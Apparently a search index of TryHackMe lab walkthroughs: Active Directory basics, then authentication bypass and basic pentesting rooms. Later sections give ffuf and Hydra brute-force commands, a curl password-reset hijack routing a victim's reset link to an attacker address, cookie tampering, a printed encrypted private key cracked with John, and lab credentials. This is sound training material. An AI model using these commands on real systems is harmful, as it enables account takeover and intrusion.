domain. Domain Users Includes all existing user accounts in the domain. Domain Computers Include all existing computers/machines in the domain. Domain Controllers Include all existing Domain Controllers on the domain. <p>A complete list of default security groups can be obtained from the Microsoft documentation on Active Directory security groups.</p>"},{"location":"walkthroughs/thm/activedirectorybasics/#active-directory-users-and-computers","title":"Active Directory Users and Computers","text":"<p>To configure users, groups, or machines in Active Directory, we need to log into the Domain Controller and run <code>Active Directory Users and Computers</code> from the start menu.</p> <p></p> <p>This will open up a window where you can see the hierarchy of users, computers, and groups that exist in the domain. These objects are organized in Organizational Units (OUs) which are container objects that allow you to classify users and machines. OUs are mainly used to define sets of users with similar policing requirements (ie. Sales staff vs Engineering Staff vs Marketing Staff vs IT). </p> <p>Note</p> <p>A user can only be part of a single OU at a time.</p> <p></p> <p>In the above example, we can see that there is already an OU called <code>THM</code> with five child OUs for the IT, Management, Marketing, Research and Development, and Sales. It is very typical for OUs to mimic the business' structure as it allows for efficient deployment of baseline policies that apply to the entire department.</p> <p>Opening any OU reveals the users they contain. Here we can perform simple tasks like creating, deleting, or modifying the users as needed. Password reset can also be done here if needed.</p> <p></p> <p>Apart from the custom <code>THM</code> OU, Windows automatically creates the following default containers (or OUs):</p> <ul> <li>Builtin: Contains default groups available to any Windows host.</li> <li>Computers: Contains any machine that joins the network by default. These machines can be moved if needed.</li> <li>Domain Controllers: Default OU that contains the Domain Controllers in the network.</li> <li>Users: Default users and groups that apply to a domain-wide context.</li> <li>Managed Service Accounts: Holds accounts used by services in the Windows domain.</li> </ul>"},{"location":"walkthroughs/thm/activedirectorybasics/#security-groups-vs-ous","title":"Security Groups vs OUs","text":"<p>Both security groups and OUs are used to classify users and computers but their purposes are entirely different:</p> <ul> <li>OUs: Used for applying policies to users and computers which include specific configurations that pertain to sets of users depending on their particular role in the enterprise. A user can only be a member of a single OU at a time.</li> <li>Security Groups: Used to grant permissions over resources (ie: allow some users to access a shared folder or a network printer). A user can be part of many groups which is needed to grant access to multiple resources.</li> </ul>"},{"location":"walkthroughs/thm/activedirectorybasics/#managing-users-in-active-directory","title":"Managing Users in Active Directory","text":"<p>In this section, will look at managing users within the existing Active Directory OUs.</p>"},{"location":"walkthroughs/thm/activedirectorybasics/#deleting-extra-ous-and-users","title":"Deleting Extra OUs and Users","text":"<p>To delete an existing OU, right-click on the OU and select Delete. When prompted for confirmation, click Yes. This should delete the OU in question unless it is protected against accidental deletion, in which case you will receive the following error message.</p> <p></p> <p>By default, OUs are protected against accidental deletion. To delete protected OUs, <code>Advanced Features</code> need to be enabled in the <code>View</code> menu.</p> <p></p> <p>Enabling Advanced Features will display additional containers and will enable us to disable accidental deletion protection. Right-click on the OU and go to the Properties. Under the <code>Object</code> tab, uncheck <code>Protect object from accidental deletion</code>.</p> <p></p> <p>Click Apply and OK to exit out of the Properties window. Now we should be able to right-click the OU and delete it without issue. You will be prompted to confirm that you want to delete the OU; any users, groups, or OUs under it will also be deleted.</p>"},{"location":"walkthroughs/thm/activedirectorybasics/#delegation","title":"Delegation","text":"<p>Active Directory provides the ability to give specific users some control over some OUs. This process is known as delegation and allows us to grant users specific privileges to perform advanced tasks on OUs without needing a Domain Admin to intervene. An example of where delegation is useful is granting IT support group privileges to reset other low-level users' passwords.</p> <p>To delegate control over an OU, right-click on the OU and select <code>Delegate Control</code>.</p> <p></p> <p>This will open a new window where we will be asked the name of the user to whom we wish to delegate control to. Click Add and enter the name of the user to whom we wish to delegate control to under the <code>Enter the object names to select</code> section. It is advisable to use the <code>Check Names</code> functionality to avoid mistyping the user's name.</p> <p></p> <p></p> <p>Click OK and Next. As we are attempting to delegate password reset privileges, in the next window, select the appropriate task we wish to delegate.</p> <p></p> <p>Click Next and then Finish to complete the delegation.</p> <p>As a side note, when delegating tasks such as password reset, low-privilege user may not have the correct privileges access to the Active Directory Users and Computers window. In this case, Powershell can be utilized to complete the task. For example, <code>phillip</code> can reset the password for for the user <code>sophie</code> with the following commands:</p> <pre><code>PS C:\\Users\\phillip&gt; Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose\n\nNew Password: *********\n\nVERBOSE: Performing the operation \"Set-ADAccountPassword\" on target \"CN=Sophie,OU=Sales,OU=THM,DC=thm,DC=local\".\n\nPS C:\\Users\\phillip&gt; Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose\n\nVERBOSE: Performing the operation \"Set\" on target \"CN=Sophie,OU=Sales,OU=THM,DC=thm,DC=local\".\n</code></pre>"},{"location":"walkthroughs/thm/activedirectorybasics/#managing-computers-in-active-directory","title":"Managing Computers in Active Directory","text":"<p>By default, all machines that join a domain (except for the Domain Controllers) will be placed under the container called Computers.</p> <p>While there is no golden rule on how to organize machines on a domain, an excellent starting point is segregating devices according to their use. In general, it is expected to have devices divided into at least the following three categories:</p> <ul> <li>Workstations: Workstations are one of the common devices within an Active Directory domain. Each user in the domain will likely be logging into a workstation. This is the device they will use to do their work or normal browsing activities. These devices should never have a privileged user signed into them.</li> <li>Servers: Servers are the second most common devices within an Active Directory domain. Servers are generally used to provide services to users or other servers.</li> <li>Domain Controllers: Domain Controllers are the third most common devices within an Active Directory domain. Domain Controllers allow you to manage the Active Directory domain. These devices are often deemed the most sensitive devices within the network as they contain hashed passwords for all user accounts within the environment.</li> </ul> <p>A machine can be moved to designated OU by right-clicking on the machine and selecting Move in the context menu.</p>"},{"location":"walkthroughs/thm/activedirectorybasics/#group-policies","title":"Group Policies","text":"<p>The key benefit of Active Directory is the ability to deploy different policies for each OU individually. This way, we can push different configurations and security baselines to users depending on their department and function.</p> <p>Windows manages such policies through Group Policy Objects (GPO). GPOs are simply collection of settings that can be applied to OUs. GPOs can contain policies aimed at either users or computers, allowing us to set a baseline on specific machines and identities.</p> <p>To configure GPOs, the Group Policy Management tool is used.</p> <p></p> <p>To configure Group Policies we first need to create a GPO under <code>Group Policy Objects</code> and then link it to the GPO where we want the policies to apply. As an example, we can see there are some already existing GPOs on the following machine:</p> <p></p> <p>We can see in the image above that 3 GPOs have been created. From those, the <code>Default Domain Policy</code> and <code>RDP Policy</code> are linked to the <code>thm.local</code> domain as a whole, and the <code>Default Domain Controllers Policy</code> is linked to the <code>Domain Controllers</code> OU only. It is important to note that a GPO will apply to the linked OU and any sub-OUs under it.</p> <p>To edit a GPO, right-click on the GPO and select Edit in the context menu.</p>"},{"location":"walkthroughs/thm/activedirectorybasics/#gpo-distribution","title":"GPO Distribution","text":"<p>GPOs are distributed to the network via a network share called <code>SYSVOL</code>, which is stored in the Domain Controller. All users typically have access to this share over the network to sync their GPOs periodically. The SYSVOL share points by default to <code>C:\\Windows\\SYSVOL\\sysvol\\</code> directory on each of the Domain Controllers in the network.</p> <p>Once a change has been made to any GPOs, it can take up to 2 hours for computers to synchronize. A computer can be forced to sync its GPOs immediately by running the following command:</p> <pre><code>PS C:\\&gt; gpupdate /force\n</code></pre>"},{"location":"walkthroughs/thm/activedirectorybasics/#authentication-methods","title":"Authentication Methods","text":"<p>When using Windows domains, all credentials are stored in the Domain Controllers. Whenever a user tries to authenticate to a service suing domain credentials, the service will need to ask the Domain Controller to verify if they are correct. Two protocols can be sued for network authentication in Windows domains:</p> <ul> <li>Kerberos: Used by any recent version of Windows. This is the default protocol in any recent domain.</li> <li>NetNTLM: Legacy authentication protocol for compatibility purposes.</li> </ul> <p>While NetNTLM should be considered obsolete, most networks will have both protocols enabled.</p> <p>Let's look deeper at how each protocol works.</p>"},{"location":"walkthroughs/thm/activedirectorybasics/#kerberos-authentication","title":"Kerberos Authentication","text":"<p>Kerberos authentication is the default authentication protocol for any recent version of Windows. Users who log into a service using Kerberos will be assigned tickets. These tickets can be though of as proof of previous authentication. Users with tickets can present them to a service to demonstrate they have already authenticated into the network before and therefore enabled to use it.</p> <p>Following is the basic process for Kerberos authentication:</p> <ol> <li> <p>The user sends their username and a timestamp encrypted using a key derived from their password to the Key Distribution Center (KDC). KDC is a service usually installed on the Domain Controller which is in-charge of creating Kerberos tickets on the network.  The KDC will create and send back a Ticket Granting Ticket (TGT) which allows the user to request additional tickets to access specific services. The need for a ticket to get more tickets allows users to request service tickets without passing their credentials every time they want to connect to a service. Along with TGT, a Session Key is given to the user which they will need to generate the following requests.  The TGT is encrypted using the krbtgt account's password hash and therefore the user can't access its contents. The encrypted TGT includes a copy of the Sessions Key as part of its content and the KDC has no need to store the Session Key as it can recover a copy by decrypting the TGT if needed.  </p> </li> <li> <p>When a user wants to connect to a service on the network like a share, website, or database, they will use their TGT to ask the KDC for a Ticket Granting Service (TGS). TGS are tickets that allow connection only to the specific service they were created for. To request TGS, the user will send their username and timestamp encrypted using the Session Key, along with the TGT and a Service Principal Name (SPN) which indicates the service and server name we intend to access.  As a result, the KDC will send us a TGS along with a Service Session Key, which we will need to authenticate to the service we want to access. The TGS is encrypted using a key derived form the Service Owner Hash. The Service Owner is the user or machine account that the service runs under. The TGS contains a copy of the Service Session Key in its encrypted contents so that the Service Owner can access it by decrypting the TGS.  </p> </li> <li> <p>The TGS can then be sent to the desired service to authenticate and establish a connection. The service will use its configured account's password hash to decrypt the TGS and validate the Service Session Key.  </p> </li> </ol>"},{"location":"walkthroughs/thm/activedirectorybasics/#netntlm-authentication","title":"NetNTLM Authentication","text":"<p>NetNTLM works by using a challenge-response mechanism. The entire process is as follows:</p> <p></p> <ol> <li>The client sends an authentication request to the server they want to access.</li> <li>The server generates a random number and sends it as a challenge to the client.</li> <li>The client combines their NTLM password hash with the challenge (and other known data) to generate a response to the challenge and sends it back to the server for verification.</li> <li>The server forwards the challenge and the response to the Domain Controller for verification.</li> <li>The Domain Controller uses the challenge to recalculate the response and compares it to the original response sent by the client. If they both match, the client is authenticated; otherwise, access is denied. The authentication result is sent back to the server.</li> <li>The server forwards the authentication result ot the client.</li> </ol> <p>Note that the user's password (or hash) is never transmitted through the network for security.</p>"},{"location":"walkthroughs/thm/activedirectorybasics/#trees-forests-and-trusts","title":"Trees, Forests and Trusts","text":"<p>As companies grow, so do their networks. Having a single domain for a company is only feasible for small enterprises. As organizations grow, additional domains will inevitably need to be added.</p>"},{"location":"walkthroughs/thm/activedirectorybasics/#trees","title":"Trees","text":"<p>Active Directory supports integrating multiple domains so that the network can be partitioned into units that can be managed independently. If two domains share the same namespace (ie: thm.local), those domains can be joined into Tree.</p> <p>In our example, if the <code>thm.local</code> (Domain Controller Root) was split into two subdomains for UK and US branches, we could build a tree with a root domain of <code>thm.local</code> and two subdomains called <code>uk.thm.local</code> and <code>us.thm.local</code>, each with its on Active Directory, computers, and users.</p> <p></p> <p>This partitioned structure gives us better control over who can access what in the domain. Group policies can also be configured independently for each domain in the tree.</p> <p>A new security group needs to be introduced when talking about trees and forests. The Enterprise Admins Group will grant a user administrative privileges over all of an enterprise's domains. Each domain would still have its Domain Admins with administrator privileges over their single domains and the Enterprise Admins who can control everything in the enterprise.</p>"},{"location":"walkthroughs/thm/activedirectorybasics/#forests","title":"Forests","text":"<p>The domains you manage can also be configured in different namespaces. Suppose a company continues to grow and eventually acquires another company called <code>MHT Inc</code>. When both companies merge, there will be different domain trees for each company. The union of several trees with different namespaces into the same network is known as forests.</p> <p></p>"},{"location":"walkthroughs/thm/activedirectorybasics/#trust-relationships","title":"Trust Relationships","text":"<p>A trust relationship between domains allows us to authorize a user from a different domain to access resources from our domain. The simplest trust relationship that can be established is a one-way trust relationship. In a one-way trust, if <code>Domain-AAA</code> trusts <code>Domain-BBB</code> then a user on BBB can be authorized to access resources on AAA.</p> <p></p> <p>The direction of the one-way trust relationship is contrary to that of the access direction.</p> <p>Two-way trust relationships can also be made to allow bidirectional authorization of users. By default, joining several domains under a tree or a forest will form a two-way trust relationship.</p> <p>It is important to note that having a trust relationship between domains does not automatically grant access to all resources on other domains. Once a trust relationship is established, you have the chance to authorize users across different domains, but it is up to you what is actually authorized or not.</p>"},{"location":"walkthroughs/thm/authenticationbypass/","title":"Authentication Bypass","text":""},{"location":"walkthroughs/thm/authenticationbypass/#task-1-brief","title":"Task 1 - Brief","text":"<p>In this room, we will learn about different ways website authentication methods can be bypassed, defeated, or broken.</p>"},{"location":"walkthroughs/thm/authenticationbypass/#task-2-username-enumeration","title":"Task 2 - Username Enumeration","text":"<p>It is helpful to create a list of valid usernames when trying to find authentication vulnerabilities. Website error messages are great resources for username information to build our list. A good example of this is error messages on account registration forms informing the user if a user with the desired name already exists on the system. We can use the existence of these types of messages to build our list of valid usernames for the web application.</p> <p>We can use the <code>ffuf</code> utility along with a list of commonly used usernames to automate this process. Let's look at a practical example. The task provides us with a website with a user signup page. Trying to register a user which already exists presents with an error message \"An account with this username already exists\". We can utilize <code>ffuf</code> to fuzz the the web form and create a list of valid usernames which already have an account.</p> <p></p> <p>The general syntax we will be using is as follows:</p> <pre><code>ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -X POST -d \"username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x\" -H \"Content-Type: application/x-www-form-urlencoded\" -u http://10.10.10.230/customers/signup -mr \"username already exists\"\n</code></pre> <ul> <li><code>-w</code> switch allows us to specify the worldlist we want <code>ffuf</code> to use for our attack.</li> <li><code>-X</code> switch specifies the HTTP request method (POST being common when data is being sent to a server).</li> <li><code>-d</code> switch specifies the data we are sending which is vary based on the web application. As we want to enumerate usernames, we use the <code>FUZZ</code> parameter as the data being passed for the <code>username</code> field.</li> <li><code>-H</code> argument is used for adding additional headers to the request.</li> <li><code>-mr</code> switch specifies the text on the page we are looking for to validate we have found a valid username.</li> </ul> <p>Note that the data fields for the input boxes can be found in our instance by looking at the page-source for our webpage.</p> <p></p> <p></p> <p>Let's put the valid usernames found by <code>ffuf</code> in a file called <code>valid_usernames.txt</code> which we will use later on.</p>"},{"location":"walkthroughs/thm/authenticationbypass/#task-3-brute-force","title":"Task 3 - Brute Force","text":"<p>With a list of valid usernames, a login page of a web application can be brute-forced using a list of commonly used passwords. A brute-force attack is an automated process that tries a list of commonly used passwords against either a single username or a list of usernames. Once again, the <code>ffuf</code> utility can be used for this purpose.</p> <p>Let's continue with our previous example. With a list of valid usernames, we can begin brute-forcing the login page of the website using <code>ffuf</code> with the following syntax:</p> <p><pre><code>ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d \"username=W1&amp;password=W2\" -H \"Content-Type: application/x-www-form-urlencoded\" -u http://10.10.10.230/customers/login -fc 200\n</code></pre> Here, we are defining two word lists with two separate fuzzing parameters (W1 and W1 for their respective wordlists). The <code>-fc</code> argument checks for an HTTP status code other than 200 (ie: filters the response to show HTTP status codes other than the specified 200).</p> <p></p>"},{"location":"walkthroughs/thm/authenticationbypass/#task-4-logic-flaw","title":"Task 4 - Logic Flaw","text":"<p>A logic flaw is when the typical logical path of an application is either bypassed, circumvented, or manipulated by an attacker. Logic flaws can exist in any area of a web application but in this task we will be looking at examples related to authentication.</p> <p>Let's look at an example. The example code below checks to see whether the start of the path the client is visiting begins with <code>/admin</code>. If this is true, then further checks are made to see whether the client is an admin. If the page doesn't begin with the <code>/admin</code>, the page is shown to the client.</p> <p><pre><code>if( url.substr(0,6) === '/admin') {\n    # Code to check user is an admin\n} else {\n    # View Page\n}\n</code></pre> Because the above PHP code example uses three equal signs (===), it is looking for an exact match on the string, including the same letter case. The code presents a logic flaw because an unauthenticated user requesting <code>/adMin</code> will not have their privileges checked and hae the page displayed to them (bypassing authentication checks entirely).</p> <p>Let's look at a more practical example. We are going to examine the Reset Password function of the web application provided in this task. Navigating to the site, we find a fom asking for the email address associated with the account on which we wish to perform the password reset.</p> <p></p> <p>If an invalid email is entered, an error message \"Account not found from supplied email address\" is displayed.</p> <p></p> <p>Trying a valid email address (such as robert@acmeitsupport.thm) presents us with a new form which requires the username associated with this login email address.</p> <p></p> <p>If we enter the username from the list we created earlier (in particular the username robert since we are using his email), we will be presented with a confirmation message that a password reset email will be sent to the supplied email address: <code>robert@acmeitsupport.thm</code></p> <p></p> <p>We are told that in the second step of the reset email process, the username is submitted in a POST field to the web server and the email address is sent in the query string request as a GET field. We can illustrate this by using <code>curl</code> to manually make the request to the web server.</p> <p><pre><code>curl 'http://10.10.10.230/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'\n</code></pre> In the web application backend, the user account is retrieved using the query string and in the application logic, the password reset email is sent using the data found in the PHP variable <code>$_REQUEST</code>.</p> <p>The PHP <code>$_REQUEST</code> variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string. So if we add another parameter to the POST form, we can control where the password reset email gets delivered.</p> <p><pre><code>curl 'http://10.10.10.230/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&amp;email=attacker@hacker.com'\n</code></pre> </p> <p>To continue, let's create an account on the Acme IT support customer section, doing so gives us a unique email address that can be used to create support tickets. The email address is in the format of <code>{username}@customer.acmeitsupport.thm</code>.</p> <p></p> <p>Note that we created a user named <code>test</code> and are given an email address of <code>test@customer.acmeitsupport.thm</code>. Now lets go back to our malicious payload and replace the placeholder email address with the one we control.</p> <p><pre><code>curl 'http://10.10.10.230/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&amp;email=test@customer.acmeitsupport.thm'\n</code></pre> Running the <code>curl</code> command above will create a ticket on our account whose contents will be the password reset link for Robert.</p> <p></p> <p>Using this link we can log into Robert's account.</p> <p></p>"},{"location":"walkthroughs/thm/authenticationbypass/#task-5-cookie-tampering","title":"Task 5 - Cookie Tampering","text":"<p>Examining and editing the cookies set by the web server during online sessions can have consequences such as unauthenticated access, access to another user's account, or elevated privileges.</p>"},{"location":"walkthroughs/thm/authenticationbypass/#plain-text","title":"Plain Text","text":"<p>The contents of some cookies can be in plain text. Take for example the following cookies set after a successful login:</p> <p><pre><code>Set-Cookie: logged_in=true; Max-Age=3600; Path=/\nSet-Cookie: admin=false; Max-Age=3600; Path=/\n</code></pre> We see that the first cookie controls whether the user is currently logged in or not while the second cookie controls whether the user is an admin or not. Using this logic, an attacker may be able to change the contents of the cookies and make requests to get privilege escalation.</p> <p>Let's look at a practical example. We begin by making a request to a target page.</p> <p><pre><code>curl http://10.10.10.230/cookie-test\n</code></pre> </p> <p>In our response we can see the message \"Not Logged In\". Now let's send another request with the <code>logged_in</code> cookie set to <code>true</code> and the <code>admin</code> cookie set to <code>false</code>.</p> <p><pre><code>curl -H \"Cookie: logged_in=true; admin=false\" http://10.10.10.230/cookie-test\n</code></pre> </p> <p>As we can see, we are not logged in as <code>User</code>. Now let's set the <code>admin</code> cookie to <code>true</code> as well.</p> <p><pre><code>curl -H \"Cookie: logged_in=true; admin=true\" http://10.10.10.230/cookie-test\n</code></pre> </p> <p>This returns the result of \"Logged In As An Admin\".</p>"},{"location":"walkthroughs/thm/authenticationbypass/#hashing","title":"Hashing","text":"<p>Often the contents of cookies are hashed using strong cryptographic hashing algorithms making them difficult if not impossible to tamper with. For weaker hashing algorithms like MD5 and SHA1, rainbow table attacks can be used. Online tools like Crackstation can be used to crack weak hashes.</p>"},{"location":"walkthroughs/thm/authenticationbypass/#encoding","title":"Encoding","text":"<p>Encoding is similar to hashing that it creates what appears to be a random string of text; however unlike hashing algorithms, encoding algorithms are reversible. Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.</p> <p>Common encoding types are base32 which converts binary data to the characters A-Z and 2-7, and base64 which converts using the characters a-z, A-Z, 0-9, +, / and the equals sign for padding at the end of the string.</p> <p>There are many offline and offline tools which can be used to encode and decode using various encoding methods. One good resource is CyberChef.</p>"},{"location":"walkthroughs/thm/basicpentesting/","title":"Basic Pentesting","text":""},{"location":"walkthroughs/thm/basicpentesting/#reconosint","title":"Recon/OSINT","text":"<p>Target IP: 10.10.48.55 (expired)</p> <p>Target IP: 10.10.254.103</p>"},{"location":"walkthroughs/thm/basicpentesting/#enumeration","title":"Enumeration","text":""},{"location":"walkthroughs/thm/basicpentesting/#nmap-scan","title":"Nmap Scan","text":"<p>Enumerate open ports and services running on the target machine.</p> <pre><code>sudo nmap -sC -SV -oN initial.nmap 10.10.48.55\n</code></pre> <p></p> <p>Webpage (port 80) source code:</p> <pre><code>&lt;html&gt;\n&lt;h1&gt;Undergoing maintenance&lt;/h1&gt;\n&lt;h4&gt;Please check back later&lt;/h4&gt;\n&lt;!-- Check our dev note section if you need to know what to work on. --&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"walkthroughs/thm/basicpentesting/#feroxbuster-scan","title":"Feroxbuster Scan","text":"<p>Enumerate hidden directories and subdomains.</p> <p><pre><code>feroxbuster -u http://10.10.48.55 -o ferox.output\n</code></pre> </p> <p>Found: <code>http://10.10.48.55/development/</code></p>"},{"location":"walkthroughs/thm/basicpentesting/#enum4linux","title":"Enum4linux","text":"<p>Enumerate information on Samba (SMB) using enum4linux.</p> <p><pre><code>sudo enum4linux 10.10.48.55\n</code></pre> Seems like SMB share <code>Anonymous</code> allows access without password.</p> <p></p> <p></p> <p>Target IP 10.10.48.55 expired due to taking too long. New target IP = 10.10.254.103</p> <p>Reading staff.txt reveals users <code>Jan</code> and <code>Kay</code>.</p>"},{"location":"walkthroughs/thm/basicpentesting/#exploitation","title":"Exploitation","text":"<p>File <code>j.txt</code> in <code>/development</code> hints that Jan's user password is weak.</p> <p>Attempt ssh password brute forcing for <code>Jan</code> using <code>Hydra</code>.</p> <p><pre><code>sudo hydra -l jan -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 10.10.254.103 ssh\n</code></pre> </p> <p>Credentials Found: <code>jan:armando</code></p> <p>Log into ssh using above credentials. Nothing meaningful found in Jan's home directory but able to access Kay's home directory.</p>"},{"location":"walkthroughs/thm/basicpentesting/#privilege-escalation","title":"Privilege Escalation","text":"<p>Directory listing of <code>Kay</code> shows <code>pass.bak</code> file which requires Kay's user permission to read. </p> <p></p> <p>Kay's <code>.ssh</code> folder contains her <code>id_rsa</code> private key which is readable by anyone.</p> <p></p> <pre><code>-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75\n\n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\n-----END RSA PRIVATE KEY-----\n</code></pre> <p>Save the above ID_RSA key under <code>kay_id_rsa</code>. This key has a password enabled which needs to be a cracked before we can use it. The private key also needs appropriate permissions of <code>chmod 600</code> prior to being used.</p> <p>Use <code>ssh2john</code> to convert RSA key into a format usable by <code>John the Ripper</code>. Then use <code>John the Ripper</code> to crack the hash using the <code>rockyou.txt</code> wordlist.</p> <pre><code>sudo ssh2john kay_id_rsa &gt; kay_id_rsa.hash\n</code></pre> <pre><code>john kay_id_rsa.hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt\n</code></pre> <p>Credentials Found: <code>kay_id_rsa:beeswax</code></p> <p>Log into SSH using Kay's id_rsa key and the above credentials. </p> <p></p> <p>Found Kay's user password!!!</p> <p></p>"},{"location":"walkthroughs/thm/blue/","title":"Blue","text":""},{"location":"walkthroughs/thm/blue/#reconosint","title":"Recon/OSINT","text":"<p>Attacker IP: 10.2.4.35</p> <p>Target IP ($IP): 10.10.234.217</p>"},{"location":"walkthroughs/thm/blue/#enumeration","title":"Enumeration","text":""},{"location":"walkthroughs/thm/blue/#nmap-scan","title":"Nmap Scan","text":"<p>Enumerate open ports and services running on the target machine.</p> <pre><code>sudo nmap -sC -SV -oN nmap_initial.output $IP\n</code></pre> <p></p> 